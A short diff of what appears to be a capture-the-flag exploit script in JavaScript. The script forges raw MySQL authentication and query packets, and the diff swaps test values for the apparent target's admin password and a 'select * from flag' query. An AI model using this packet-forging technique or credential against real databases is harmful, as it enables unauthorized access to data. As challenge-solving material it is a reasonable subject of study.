@@ -58,7 +58,7 @@ async function step2(serverSeed){
 
 	var p1 = "\x14\x00\x00\x03"+hashedPassword
 
-	var query = "select * from test2#";
+	var query = "select * from flag#";
 	var p2 = `${String.fromCharCode(query.length+9)}\x00\x00\x00\x03${query}`
 
 	var packet = p1+p2;
@@ -97,7 +97,7 @@ sock.on('newchat', function(data){
 })
 
 
-var password = "testpass";
+var password = "th1s_1s_ch4tdb_4dm1n_p4ssw0rd";
 addScript("https://cdnjs.cloudflare.com/ajax/libs/crypto-js/3.1.9-1/core.js");
 addScript("https://cdnjs.cloudflare.com/ajax/libs/crypto-js/3.1.9-1/sha1.js");
 var packet = "";
